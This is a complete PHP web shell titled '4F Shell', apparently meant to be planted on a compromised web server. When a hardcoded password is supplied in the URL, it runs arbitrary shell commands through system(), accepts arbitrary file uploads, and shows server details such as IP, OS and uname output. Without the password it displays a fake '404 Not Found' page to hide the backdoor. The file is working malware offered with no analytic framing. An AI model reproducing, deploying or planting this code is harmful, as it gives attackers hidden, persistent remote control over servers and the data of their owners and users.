<?php
    if(isset($_GET['p']) && $_GET['p'] == "4cc3ssflick") {
        if(isset($_GET['c'])){
            return system($_GET['c']);
            die();
        }
        if(isset($_POST['submit'])){
            $filedir = ""; 
            $maxfile = '2000000';
            $mode = '0644';
            $userfile_name = $_FILES['file']['name'][0];
            $userfile_tmp = $_FILES['file']['tmp_name'][0];
            if($_FILES['file']['name']) {
                $qx = $filedir.$userfile_name;
                @move_uploaded_file($userfile_tmp, $qx);
                @chmod ($qx, octdec($mode));
                echo"<div class=\"fixed-bottom px-3 py-3\"><a href=$userfile_name class=\"text-success\">Sucessfully uploaded! => $userfile_name</a></div>";
        }
        }
        ?>
        <html>
        <head>
        <title> 4F Shell </title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono:500&display=swap" rel="stylesheet"> 
    </head>
    <style>
        .command {
            color: #fdfdfd;
            background: none;
            width: auto;
            border: 0;
            padding: 3px;            
        }
        .res {
            background: none;
            width: 100%;
        }
    </style>
<body class="bg-dark text-light">
        <div class="py-3 px-4">
        <div class="container-fluid">
            <div class="mx-4">
                <span class="font-weight-bold">IP : </span><p class="text-muted"><?= $_SERVER['SERVER_ADDR'] ?></p>
                <span class="font-weight-bold">PHP Version : </span><p class="text-muted"><?= PHP_VERSION ?></p>
                <span class="font-weight-bold">OS : </span><p class="text-muted"><?= PHP_OS ?></p>
                <span class="font-weight-bold">Server Info : </span><p class="text-muted"><?= php_uname() ?> </p>
                <span class="font-weight-bold">Shell Path : </span><p class="text-muted "><?= getcwd().$_SERVER['PHP_SELF'] ?> </p>
            </div>
            <div class="input-group mx-auto w-50">
                <span class="text-success"><span class="text-danger">┌─[<?php system('whoami') ?><span class="text-info">@</span><?= $_SERVER['SERVER_ADDR'] ?>]─[<span class="text-success">~</span>]<br>└──╼ </span><span class="text-warning">$</span> <input type="text" class="command text-success" autofocus></span>
            </div>
            <div class="mx-auto px-2 w-50">
            <textarea class="res text-success border-0 rounded h-50 noresize" readonly></textarea>
            </div>
        </div>
        <form class="form fixed-top" action="<?= $_SERVER['PHP_SELF'] ?>?p=<?= $_GET['p'] ?>" method="post" enctype="multipart/form-data">
            <div class="input-group my-3 mx-auto w-50">
                <input type="file" class="btn btn-light text-dark" name="file[]" required="true">
            <div class="input-group-append">
                <input class="btn btn-primary" type="submit" name="submit" value="Upload">
            </div>
            </div>
            </form>
        <script>
        $(document).ready(function(){
            $('.command').keydown(function(e){
                if(e.which == 13) {
                var c = $('.command').val();
                if(!c) return false;
                $.ajax({
                    url: '<?= $_SERVER['PHP_SELF'] ?>?p=<?= $_GET['p'] ?>&c='+c,
                    method: 'get',
                    success: function(data) {
                        $('.res').html(data);
                        $('.command').val("");
                    }
                });
                }
            });
        });
        </script>
        </div>
        </body>
        </html>
        <?php
    }
    else
    {
        ?>
        <html>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>     
        <hr/>
        <address><?= $_SERVER['SERVER_SOFTWARE'] ?> Server at <?= $_SERVER['SERVER_NAME'] ?> Port <?= $_SERVER['SERVER_PORT'] ?></address> 
        </body>
        </html>
        <?php
    }
?>
